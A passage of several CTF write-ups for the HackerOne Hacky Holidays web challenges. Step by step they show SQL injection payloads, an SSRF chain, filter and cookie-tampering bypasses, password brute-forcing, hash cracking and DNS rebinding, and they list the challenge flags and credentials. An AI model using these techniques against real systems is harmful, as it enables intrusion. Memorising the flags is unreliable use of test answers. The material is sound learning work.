38                <p class="text-center">flag{99309f0f-1752-44a5-af1e-a03e4150757d}</p>
39
40flag 11 -- /r3c0n_server_4fdk59 (SQLi, SQLi, ssrf, internal API ->grinchadmin:s4nt4sucks)
41        <h4 class="text-center">flag{07a03135-9778-4dee-a83c-7ec330728e72}</h4>
42
43flag 12 -- /attack-box (MD5(mrgrinch463+target), DNS rebind -> target=127.0.0.1)
44        <p><strong>flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}</strong></p>
Impact
critical, we must stop the Grinch!



==================================================

Report File: 1065829.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- None

Contents:

How we saved Christmas
As usual with H1 CTF challenges we are provided with a target URL. In our case it is the following:
https://hackyholidays.h1ctf.com/
We started by visiting the URL and see what is going on. All we could see is a page with an image with a warning message.
<image_0>
We quickly view the source code, for any potential hidden hint as a comment. All we could find was some URLs for the hosted content pointing to /assets/ but access there was Forbidden
Day 1
1) We start our enumeration via running a directory enumeration tool.
Code 62 Bytes
1./dirsearch -u https://hackyholidays.h1ctf.com/ -e php,txt,jsp
2) We get the file /robots.txt in the results. By visiting it we can see the first flag.
flag{48104912-28b0-494a-9995-a203d1e261e7}
We also notice a new directory named s3cr3t-ar3a. Once we try to visit it, we see that we have to wait for the second day of the event.
<image_1>
Day 2
1) Day 2 starts and the secret area page is now updated, with a message indicating that the page has been moved. Therefore we start some subdomain enumeration in the background, just in case and take a closer look into the page.
2) In the source code we can see after a bit the 2nd flag hiding, as also a hint for the next part of the challenge hinting that there will be an/apps directory
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
<image_2>
Day 3
1) Third day and we visit the home page, we now see a button that leads as to the following URL as expected based on day2's "awesome" recon.
https://hackyholidays.h1ctf.com/apps
We see a button and once clicked we open a new URL
https://hackyholidays.h1ctf.com/people-rater
There are some buttons on the page that once clicked pop up an alert box with some evil message.
2) We open developer tools to have a closer look and on the network tab we see that for each button a request is sent containing an id parameter which includes a base64 encode JSON value such as the following:
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=
3) Once decode we can see that it is a id numeric value. Going through multiple buttons and decoding the URL we can see that they are incremental values. However we notice that the values start from id:2 and go up, id of value 1 is missing.
4) We therefore create a new JSON value with {"id":1} and base64 encode it and pass it as a parameter to the above request.
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6MX0=
We can now see the third flag.
flag{b705fb11-fb55-442f-847f-0931be82ed9a}
<image_3>
Day 4
1) We see a new application at the following URL
https://hackyholidays.h1ctf.com/swag-shop
We notice that in order to purchase an item, we need to authenticate. However it is not possible to perform username enumeration or bypass the login via SQLi, so we need another approach.
2) We start fuzzing the /api endpoint to see if there is something hidden and not present in the source code. which exposes some API endpoints We discover the following endpoints which look interesting
Code 15 Bytes
1/sessions
2/user
3) By visiting the URL sessions we get multiple JWT looking values. We can decode them since the are base 64 encoded and see their content. One of the values stands out since it is longer than all others. Following command can be used to see that one value contains a UID and rest are NULL
Code 109 Bytes
1curl https://hackyholidays.h1ctf.com/swag-shop/api/sessions | jq -r '.sessions[]' | base64 -d | jq -r '.user'
The following uid is extracted C7DCCE-0E0DAB-B20226-FC92EA-1B9043 and noted down
4) Trying to use the session values and the cookie values within them doesn't wield any result. Therefore we go back to the /user endpoint. Once we visit it we get the following message
{"error":"Missing required fields"}
This is a good hint that we need to discover something more and we are on a right track.
5) We start fuzzing possible parameters on the URL below until we get a hit for the uuid parameter. We can then use the identified id from step 3 above and obtain the final flag.
https:////hackyholidays.h1ctf.com/swag-shop/api/user?=FUZZ
<image_4>
Url of 4th flag: https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
<image_5>
Day 5
1) We visit our new target https://hackyholidays.h1ctf.com/secure-login
2) We start by investigating the login page. By providing some random credentials we notice that the login page returns an error message such as
Invalid Username . This is a good indication of potential username enumeration.
3) We start fuzzing the username with a wordlist with name 1. After a while we can notice that one response does not contain the Invalid Username error. Therefore we have identified a valid username for the application, which is the following
Username: access
4) Now we can attempt to bruteforce the password, hoping no rate limit/account lockout is in place. We can use a password list 2
We quickly get a hit and a redirect for the following password
Password: computer
Therefore the following credentials allow access access:computer
However on the new screen we see that they are no files to download.
5) We notice though that the cookie set is base64 encoded and once decoded it contains the following values.
{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}
6) Admin is set to false, however there is no integrity validation, which might allow tampering with the cookie. We set admin to true and base64 encode the cookie. which gives us the following value. We then can set it as our cookie(securelogin) value in the browser
eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQ==
7) Once page is refreshed we have access to a zip file which we can download. When we try to unzip the file though, we are asked to provide a password.
<image_6>
Code 66 Bytes
1fcrackzip -v -D -u -p /rockyou.txt my_secure_files_not_for_you.zip
Instantly we get the password for the zip file which is hahahaha
<image_7>
Day 6
1) Once new application button is clicked we are directed to https://hackyholidays.h1ctf.com/my-diary/?template=entries.html
2) Any attempt for LFI or to use php filters seems to fail, so we proceed enumerating potential files. We notice that we can get a different response for index.php since it redirects to the page in step 1, while all other files return 404.
3) By trying to play a bit with the template parameter, hoping to get LFI we notice after a few attempt that the following URL will disclose source code
https://hackyholidays.h1ctf.com/my-diary/?template=index.php
4) We notice that some filtering is happening with the following preg_replace lines
Code 143 Bytes
1$page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
2$page = str_replace("admin.php","",$page);
3$page = str_replace("secretadmin.php","",$page);
5) So we see that special characters are removed, besides alphanumeric and the dot. Also if the keyword admin.php is detected its stripped, same for the secretadmin.php afterwards. The order of processing is important here, to craft a valid payload, which will bypass the checks and allow us to access
secretadmin.php
6) To do so we crafted the following URL

https://hackyholidays.h1ctf.com/my-diary/?template=secretasecretadmadmin.phpin.phpdmin.php
Below a representation is show of how the filtering will strip out parts of the provided input in the templates parameter, to allow us to convert our payload to the valid target file
<image_8>
<image_9>
Day 7
1) New target is Hate Mail Generator
2) We proceed with enumerating the application.
We can see that there is a created email, which has some references to templates via the following format {{template:cbdj3_grinch_header.html}} This can be a hint for later on so we note it down
We can also create our own emails. However when trying to send, we notice that we do not have enough credits. We can only preview the message. We discover that XSS is possible via the body of the preview request. Example below
preview_markup=Hello {{name}} ....&preview_data={"name":"<script>alert</script>","":"@test.com"}
Since though we can not send this data it will not be possible to achieve XSS for now, if we do not bypass the credit check somehow.
3) We also run a directory enumeration and we discover the following endpoint which has also directory listing enabled.
https://hackyholidays.h1ctf.com/hate-mail-generator/templates/
Within that directory a specific template stands out which is our potential target 38dhs_admins_only_header.html
4) We attempt to create an email and include the payload, but we notice that the application returns the following message
You do not have access to the file 38dhs_admins_only_header.html
5) We need to bypass this somehow and access the template. We notice that the preview_markup parameter applies some filtering, striping out special characters like / etc
6) Since the preview_data parameter has not filtering we decide to fuzz and attempt to tamper with it. We finally discover that we can include templates from the preview_data with a reference in the preview_markup.
Therefore we can use a payload like the following to bypass the access restriction and get the flag.
Code 231 Bytes
1POST /hate-mail-generator/new/preview HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 100
5<--Redacated-->
6
7preview_markup=Hello {{name}}....&preview_data={"name":"{{template:38dhs_admins_only_header.html}}"
flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
<image_10>
Day 8
1) New target is Evil Forum
2) We start our enumeration and we discover a few usernames
grinch
max
Two login pages
https://hackyholidays.h1ctf.com/forum/login
https://hackyholidays.h1ctf.com/forum/phpmyadmin
Attempting to bruteforce both does not wield any successful result
3) We progress with further enumeration and we perform some OSINT also. We end up using the challenge creator's name in github to find his profile
https://github.com/adamtlangley
Under that and towards the bottom of the page we can see a repository:
https://github.com/Grinch-Networks/forum
4) We visit the repository and after examining the code for a while we can not see anything sensitive leaked, So we check the commit history. We can find after a whie the following commit Initial Code Commit which leaks some credentials
Code 78 Bytes
1self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
5) We can now use the credentials above and connect to the /phpmyadmin endpoint. Within it we discover a table named user which has the two users discovered befored and their hashed md5 passwords. User grinch also has administrative privileges, therefore can view any post in the forum.
<image_11>
<image_12>
Login credentials
grinch:BahHumbug
Flag post:
https://hackyholidays.h1ctf.com/forum/3/2
flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
<image_13>
Day 9
1) New target is Evil Quiz
2) We see an input field with a username, once submitted we have to answer 3 questions and then we end up seeing results for our questions, as also a message about how many other users use that exact username. XSS payloads will not work here, since special characters are encoded and it would be a self-XSS most likely.
Since there is a comparison with a Database of usernames we proceed with attempting a simple SQL injection payload.
Plain Username Result
With our username w31rd0 we receive a result of 1 user sharing the same username
<image_14>
Username Evaluates to TRUE
With the following payload w31rd0' OR 1=1-- - the SQL query will evaluate to TRUE, since we can break the initial query and insert a statement that always evaluates to TRUE
<image_15>
The above evidence is sufficient enough to confirm the existence of SQL injection. However it is boolean-based second order, since our results can not be viewed directly when submitted and the validity of the query is based on the string returned.
3) After identifying the database type/version, we proceed with attempting to identify the table names.
To do so we can use an injection like the following
Code 100 Bytes
1' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) = 113-- -
Apporach Methodology:
The above query will attempt to compare the first letter of the first database with an ASCII value (in our case 113 is equivalent to character r)
To decrease the number of request we can try to use different comparison operators (e.g. we can do
Code 100 Bytes
1' AND (ascii(substr((SELECT schema_name FROM information_schema.schemata LIMIT 0,1),1,1))) > 113-- -
Then by querying the score endpoint, we can see if the query evaluates to TRUE or not, based on the result for the usernames
If the result gives 0 other player(s) , the query is FALSE. On the contrary if we get a value higher that zero, the query is TRUE, therefore we have identified the first letter of the first database.
We can continue with the next letter (or by adapting our request if we used the <, > operators) until we get the entire name of our target.
Move to the next entry (for the databases)
Proceeding with this approach we can get the name for the second database which looks interesting
Target DB name: quiz
4) We then can proceed with identifying the tables within the database with a similar approach as with the database names.
We obtain the following table name which seems the one we need
Target Table name: admin
5) Next we enumerate the column names for the admin table.
We obtain the following columns names which seem interesting
Target Column names: username, password
6) Now having knowledge of the table structure we can exfiltrate data with a query like the following
Code 85 Bytes
1test' AND (ascii(substr((SELECT password FROM quiz.admin LIMIT 0,1),1,1))) = 112--  -
Injection Request:
<image_16>
Injected query for password letter exfiltration evaluates to TRUE:
<image_17>
After a while we obtain the following credentials
admin:S3creT_p4ssw0rd-$
Sadly my programming skills are totally bad, however i attempted to make a script that will automate the extraction of each letter (sqli-bruteforcer.py (F1123459)).
Its not efficient enough, however it will display the first letter of the username. By editing the script we can continue bruteforcing the remaining letters.
The script include also the payloads for the tables, columns which are commented out
7) We can now login in the admin panel Admin
And obtain the flag.
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Day10
1) New target is Signup-Manager
2) We poke around a bit to examine the application. We notice in the while inspecting element a comment on the top
<!-- See README.md for assistance -->
3) Visiting the README.md we get a file. Once opened we can see a few hints with the following stadning out
Code 191 Bytes
12) Move signupmanager.zip into the new directory and unzip it.
26) You can make anyone an admin by changing the last character in the users.txt file to a Y
37) Default login is admin / password
4) Default credentials will not work, therefore they have been probably changed. We try to visit the descriptibed location for the .zip file and we manage to access it and download it. signupmanager.zip
5) Extracting the contents we see multiple .php files. However the most interesting one is the index.php
Within the file we can see all the processing that happens during the signup and creation o user accounts which is the functionality that has the most potential to be vulnerable.
What we notice is that the username, firstname and lastname are filtered and only a substring of the provided input is used (first 15 characters after all special characters have been removed and only alphanumerics remain)
Code 256 Bytes
1$username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
2$firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
3$lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
Also the following function is the one of interest since it checks if the account has administrative privileges. The most important part is the last line. It will check the 112 character and if if matches a Y it will be validated to TRUE.
Code 871 Bytes
1function buildUsers(){
2    $users = array();
3    $users_txt = file_get_contents('users.txt');
4    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
5        if( strlen($user_str) == 113 ) {
6            $username = str_replace('#', '', substr($user_str, 0, 15));
7            $users[$username] = array(
8                'username' => $username,
9                'password' => str_replace('#', '', substr($user_str, 15, 32)),
10                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
11                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
12                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
13                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
14                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
15            );
16        }
17    }
18    return $users;
19}
Also the following code is responsible for constructing the string that will be ented in the users.txt file once a user registers and will be checked with the above function.
Code 617 Bytes
1function addUser($username,$password,$age,$firstname,$lastname){
2    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
3    $line = '';
4//Pads parameters to reach 15chars by adding # and start concatinating the parameters
5    $line .= str_pad( $username,15,"#");
6    $line .= $password;
7    $line .= $random_hash;
8    $line .= str_pad( $age,3,"#");
9    $line .= str_pad( $firstname,15,"#");
10    $line .= str_pad( $lastname,15,"#");
11    $line .= 'N';
12    $line = substr($line,0,113);
13    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
14    return $random_hash;
15}
From analyzing the above code its apparent that we can not use the username, firstname, lastname in a malicious way since they are heavily sanitised.
We see though that the age parameter has less strict checks such as:
Code 62 Bytes
1if (!is_numeric($_POST["age"]))
2if (strlen($_POST["age"]) > 3)
Once those check are passed the following happens
Code 29 Bytes
1$age = intval($_POST["age"]);
This is interesting based on this post intval processing PHP 7
we can notice that intval('1e5'); will return 100000.
This fits perfectly our purpose. Since now by adding the additional values, we can overide the $line .= 'N'; which is set by default and change it to Y which will grant us administrative privilleges.
Signup Request to Obtain Admin Privileges
Code 360 Bytes
1POST /signup-manager/ HTTP/1.1
2Host: hackyholidays.h1ctf.com
3Connection: close
4Content-Length: 105
5Cache-Control: max-age=0
6Upgrade-Insecure-Requests: 1
7Origin: https://hackyholidays.h1ctf.com
8Content-Type: application/x-www-form-urlencoded
9<--REDACTED-->
10
11action=signup&username=w31rdtest&password=password&age=1e5&firstname=loadsofys&lastname=abcdefgabcdeYYY
Then we can login with the above credentials and access the hidden message with the flag.
<image_18>
Day 11
1) New target is Recon Server based on the message from Day 10.
2) After a lot of recon and attempts we discover that an SQLinjection exists on the following URL on the hash parameter
https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=
3) Also we have identified that the images hosted on the server are retrievable via a base64 value, which include an auth token that validates the file. If the authentication token is off, the file retrieval will fail, with a message that the authentication token is wrong.
Encoded File Retrieval object:
Code 160 Bytes
1eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9
Decoded Object
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}
4) Furthermore the challenge mentions the /api/* endpoint. However once we try to enumerate API endpoints we see a message.
Code 62 Bytes
1"error":"This endpoint cannot be visited from this IP address"
This is a strong indication of SSRF to be required to access API endpoints.
5) After a lot of trial and error (and then Adam's hint), trying to reverse the auth MD5 creation is not possible. Also dumping the content via the SQLi does not give any additional information, besides what we already have.
After tampering with our injection (and brainstorming with all the other troubled players), it seems that we can use the SQLi to nest additional queries, once the query is processed by the server it will also be singed with an MD5 hash that is generated and create the image object. Now the image object can successfully retrieve the desired files
6) Based also on the API response codes, we can identify if endpoints and parameters exist or not. Based on that we are able to identify that the /user endpoint exists and that it also accepts two parameters username and password
An example injection is the one below which will return the following message
Expected HTTP status 200, Received: 204
SQL Query
Code 72 Bytes
1' UNION SELECT "' union select 1,2,'../api/user?username=grinch'#",1,2# 
Injected URL
Code 166 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=%27+UNION+SELECT+%22%27+union+select+1%2C2%2C%27..%2Fapi%2Fuser%3Fusername%3Dgrinch%27%23%22%2C1%2C2%23
The above URL as described creates the signed image that can be accessed by the following URL where the data parameter contains the base64 encoded JSON data with the URL and the auth MD5 hash.
Code 217 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL3VzZXI/dXNlcm5hbWU9Z3JpbmNoIiwiYXV0aCI6IjEzYTVjMDg4NTFiNjdmNTg5ZDQ1NDBjZGJhMzE2NDhiIn0=
7)After a lot of additional fails, and attempting to identify more API endpoints and parameters, we had no luck. So we went back to the /api/user endpoint. We started fuzzing the username parameter and we identified some strange behavior.
We run our fuzzer (we can adapt the one from day10) against the username, and we notice that by injecting into the username parameter payloads it would return Invalid content type detected for one 1 specific character. We have also included the % character which can be interpreted as anything in database queries. Therefore we can assume that this is a TRUE clause, so we might be able to brute-force the username character by character based on boolean based SQLinjection.
On the below injection, we can inject between the $$ symbols (those are removed in the script just added here to highlight the injection point).
Injection URL:
Code 88 Bytes
1' UNION SELECT "' union select 1,2,'../api/user?username=grincha$$%&password=%25'#",1,2#
Below we can observe that a TRUE clause is confirmed via the error message and that the next letter on grincha is d.
<image_19>
We can perform the same brute-force for the password value, since we have already identified that its one of the parameters accepted by the user API endpoint. After a while we can end up with the final set of credentials.
grinchadmin:s4nt4sucks
8) We can now go to https://hackyholidays.h1ctf.com/attack-box/login and login to obtain the flag
flag11=flag{07a03135-9778-4dee-a83c-7ec330728e72}
<image_20>
Day 12
1) New target is https://hackyholidays.h1ctf.com/attack-box
2) We can see that there are some buttons that will send a request with a base64 encoded parameter. Once decoding the value we notice the following content
Code 68 Bytes
1{"target":"203.0.113.213","hash":"5aa9b5a497e3918c0e1900b2a2228c38"}
So the above object sets the target, but also hash a sanity check for tampering (the hash value). If we try to edit that value, the validation will fail and the attack will not start.
3) After fuzzing and trying for hours, we decide to attempt to crack the hash. Since its not in any public database, it most likely uses a salt.
Due to the nature of the challenge, most parts of it use passwords/content related to santa, grinch etc.
We therefore decide to filter out such keyword from the rockyou.txt password list and attempt to see if we can get a valid hash.
What we did is
Wordlist Generation based on Keywords
Code 72 Bytes
1cat /usr/share/wordlists.rockyou.txt | grep $keyword > keyword-salts.txt
Creation of Crackable Hash
Code 98 Bytes
1for i in $(cat keyword-salts.txt); do echo "5aa9b5a497e3918c0e1900b2a2228c38:$i >>saltedhashes.txt
Cracking with Hashcat
Code 36 Bytes
1hashcat -m 20 saltedhashses.txt pass
Additional Information for Cracking Process
Content of pass is the IP from above 203.0.113.213
Instead of mode 20 for hashcat we tried mode 10 also, since we can not be sure about the method the salting happened.
Method 20 in hashcat worked at the end and it is md5($salt.$pass)
The $keyword to grab content from rockyou.txt wordlist that worked was grinch
The final salt discovered was mrgrinch463
4) We can now attempt to forge a valid hash for a target of our choosing.
Code 304 Bytes
1Target: 127.0.0.1
2Salted Hash: 3e3f8df1658372edf0214e202acb460b
3New Payload: {"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}
4Attack URL:
5https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
But once we submit that, we get the following
<image_21>
5) We keep trying different representations of the 127.0.0.1 such as localhost, 127.1, hex and decimal representation of IP etc. But either they are blocked, or not valid IPs.
While providing hostnames we see that it also does a DNS lookup for the IP, so there might be a DNS related attack.
We move on attempting to go with DNS rebinding.
The following resource can be used rebinder to craft a domain that will resolve to the selected IPs.
We can put in one spot a random IP and in the second 127.0.0.1 as below
<image_22>
We now produce the MD5 of the hostname, we can use this web app MD5 computation to craft a salted MD5 value
6) We can now submit a new attack with the crafted payload.
Final Payload
Code 166 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiI3ZjAwMDAwMS4xNDE0MTQxNC5yYm5kci51cyIsImhhc2giOiIxZmEyZjM0NjA2YjlkMjFhNzNjZDYyNDI1OTVhOGNlZSJ9
We might need to submit this a couple of times to resolve to the desired local address. But once that happens we notice
<image_23>
7) Once attack is complete we can see the win message page and grab the final flag.
flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
<image_24>
Message to the Grinch
<image_25>
Message to Everyone Else
Thanks for this CTF. Merry Christmas to you all and a Happy New Year!! Keep Safe.
FLAGS
Here is a small Christmas Gift
Code 608 Bytes
1flag1 = flag{48104912-28b0-494a-9995-a203d1e261e7}
2flag2 = flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
3flag3 = flag{b705fb11-fb55-442f-847f-0931be82ed9a}
4flag4 = flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
5flag5 = flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
6flag6 = flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
7flag7 = flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
8flag8 = flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
9flag9 = flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
10flag10=flag{99309f0f-1752-44a5-af1e-a03e4150757d}
11flag11=flag{07a03135-9778-4dee-a83c-7ec330728e72}
12flag12=flag{ba6586b0-e482-41e6-9a68-caf9941b48a0}
Impact
We can share cookies with Santa! :)



==================================================

Report File: 1065885.json
------------------------------
Report To: Not specified
Severity: HIGH
Weaknesses:
- Business Logic Errors

Contents:

Hackyholidays
flag 1
First flag is just a matter of reading /robots.txt file:
Code 85 Bytes
1User-agent: *
2Disallow: /s3cr3t-ar3a
3Flag: flag{48104912-28b0-494a-9995-a203d1e261e7}
flag 2
Visiting /s3cr3t-ar3a and opening it with developer tools gets the second flag:
flag{b7ebcb75-9100-4f91-8454-cfb9574459f7}
It is inserted in the DOM via some obfuscated javascript code buried in /assets/js/jquery.min.js
Code 253 Bytes
1h1_0='la',h1_1='}',
2h1_2='',
3h1_3='f',
4h1_4='g',
5h1_5='{b7ebcb75',h1_6='8454-',
6h1_7='cfb9574459f7',
7h1_8='-9100-4f91-';
8document.getElementById('alertbox').setAttribute('data-info', h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1 );
flag3 /people-rater
The people rater app references entries via something like
https://hackyholidays.h1ctf.com/people-rater/entry?id=eyJpZCI6Mn0=
where the id parameter is base64 encoding of {"id":NUMBER}
Setting NUMBER=1 immediatly gives the flag:
Code 228 Bytes
1GET /people-rater/entry?id=eyJpZCI6MX0%3d HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4{ "id":"eyJpZCI6MX0=",
5  "name":"The Grinch",
6  "rating":"Amazing in every possible way!",
7  "flag":"flag{b705fb11-fb55-442f-847f-0931be82ed9a}"
8}
flag4 /swag-shop
The swag shop sells some itmes but in order to make a purchase you need a valid login as shown by this request
Code 73 Bytes
1POST /swag-shop/api/purchase HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4id=1
which gives the error:
{"error":"You are not logged in"}
Fuzzing via ffuf we can find /swag-shop/api/sessions which contains some interesting stuff
{"sessions":["eyJ1c2VyIjpudWxsLCJjb29raWUiOiJZelZtTlRKaVlUTmtPV0ZsWVRZMllqQTFaVFkxTkRCbE5tSTBZbVpqTW1ObVpHWXpNemcxTVdKa1pEY3lNelkwWlRGbFlqZG1ORFkzTkRrek56SXdNR05pWmpOaE1qUTNZMlJtWTJFMk4yRm1NemRqTTJJMFpXTmxaVFZrTTJWa056VTNNVFV3WWpka1l6a3lOV0k0WTJJM1pXWmlOamsyTjJOak9UazBNalU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJaak0yTXpOak0ySmtaR1V5TXpWbU1tWTJaamN4TmpkbE5ETm1aalF3WlRsbVkyUmhOall4TldNNVkyWTFaalkyT0RVM05qa3hNVFEyTnprMFptSXhPV1poTjJaaFpqZzBZMkU1TnprMU5UUTJNek16WlRjME1XSmxNelZoWkRBME1EVXdZbVEzTkRsbVpURTRNbU5rTWpNeE16VTBNV1JsTVRKaE5XWXpPR1E9In0=","eyJ1c2VyIjoiQzdEQ0NFLTBFMERBQi1CMjAyMjYtRkM5MkVBLTFCOTA0MyIsImNvb2tpZSI6Ik5EVTBPREk1TW1ZM1pEWTJNalJpTVdFME1tWTNOR1F4TVdFME9ETXhNemcyTUdFMVlXUmhNVGMwWWpoa1lXRTNNelUxTWpaak5EZzVNRFEyWTJKaFlqWTNZVEZoWTJRM1lqQm1ZVGs0TjJRNVpXUTVNV1E1T1dGa05XRTJNakl5Wm1aak16WmpNRFEzT0RrNVptSTRaalpqT1dVME9HSmhNakl3Tm1Wa01UWT0ifQ==","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRFJtWVRCaE4yRmlOalk1TUdGbE9XRm1ZVEU0WmpFMk4ySmpabVl6WldKa09UUmxPR1l3TWpJMU9HSXlOak0xT0RVME5qYzJZVGRsWlRNNE16RmlNMkkxTVRVek16VmlNakZoWXpWa01UYzRPREUzT0dNNFkySmxPVGs0TWpKbE1ESTJZalF6WkRReE1HTm1OVGcxT0RReFpqQm1PREJtWldReFptRTFZbUU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNMlEyTURJek5EZzVNV0UwTjJNM05ESm1OVEl5TkdNM05XVXhZV1EwTkRSbFpXSTNNVGc0TWpJM1pHUmtNVGxsWlRNMlpEa3hNR1ZsTldFd05tWmlaV0ZrWmpaaE9EZzRNRFkzT0RsbVpHUmhZVE0xWTJJeU1HVmhNakExTmpkaU5ERmpZekJoTVdRNE5EVTFNRGM0TkRFMVltSTVZVEpqT0RCa01qRm1OMlk9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNV1kzTVRBek1UQmpaR1k0WkdNd1lqSTNaamsyWm1Zek1XSmxNV0V5WlRnMVl6RTBNbVpsWmpNd1ltSmpabVE0WlRVMFkyWXhZelZtWlRNMU4yUTFPRFkyWWpGa1ptRmlObUk1WmpJMU0yTTJNRFZpTmpBMFpqRmpORFZrTlRRNE4yVTJPRGRpTlRKbE1tRmlNVEV4T0RBNE1qVTJNemt4WldOaE5qRmtObVU9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJNRE00WXpoaU4yUTNNbVkwWWpVMk0yRmtabUZsTkRNd01USTVNakV5T0RobE5HRmtNbUk1T1RjeU1EbGtOVEpoWlRjNFlqVXhaakl6TjJRNE5tUmpOamcyTm1VMU16VmxPV0V6T1RFNU5XWXlPVGN3Tm1KbFpESXlORGd5TVRBNVpEQTFPVGxpTVRZeU5EY3pOakZrWm1VME1UZ3hZV0V3TURVMVpXTmhOelE9In0=","eyJ1c2VyIjpudWxsLCJjb29raWUiOiJPR0kzTjJFeE9HVmpOek0xWldWbU5UazJaak5rWmpJd00yWmpZemRqTVdOaE9EZzRORGhoT0RSbU5qSTBORFJqWlRkbFpUZzBaVFV3TnpabVpEZGtZVEpqTjJJeU9EWTVZamN4Wm1JNVpHUmlZVGd6WmpoaVpEVmlPV1pqTVRWbFpEZ3pNVEJrTnpObU9ESTBPVE01WkRNM1kySmpabVk0TnpFeU9HRTNOVE09In0="]}
In particular one session is longer than others and base64 decoding of it gives
Code 236 Bytes
1{
2  "user":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043",
3  "cookie":"NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY="
4}
From javascript source we see that the session cookie is called token.
After many fuzzing tries, the key to proceed is matching all response code, even 400 errors:
Code 295 Bytes
1ffuf -u  https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ \
2-w common.txt \
3-H 'Cookie: token=NDU0ODI5MmY3ZDY2MjRiMWE0MmY3NGQxMWE0ODMxMzg2MGE1YWRhMTc0YjhkYWE3MzU1MjZjNDg5MDQ2Y2JhYjY3YTFhY2Q3YjBmYTk4N2Q5ZWQ5MWQ5OWFkNWE2MjIyZmZjMzZjMDQ3ODk5ZmI4ZjZjOWU0OGJhMjIwNmVkMTY%3D' \
4-t 4 -mc all  -fs 155
which finally gives a user endpoint which was not known before:
Code 206 Bytes
1sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]
2stock                   [Status: 200, Size: 167, Words: 8, Lines: 1]
3user                    [Status: 400, Size: 35, Words: 3, Lines: 1]
Visiting this endpoint we find this error message:
Code 260 Bytes
1GET /swag-shop/api/user HTTP/1.1
2Host: hackyholidays.h1ctf.com
3
4
5HTTP/1.1 400 Bad Request
6Server: nginx/1.18.0 (Ubuntu)
7Date: Wed, 16 Dec 2020 06:52:00 GMT
8Content-Type: application/json
9Connection: close
10Content-Length: 35
11
12{"error":"Missing required fields"}
Probably the api wants the user id. Fuzzing again with a list of common parameter names
Code 351 Bytes
1ffuf -u  'https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=C7DCCE-0E0DAB-B20226-FC92EA-1B9043' \
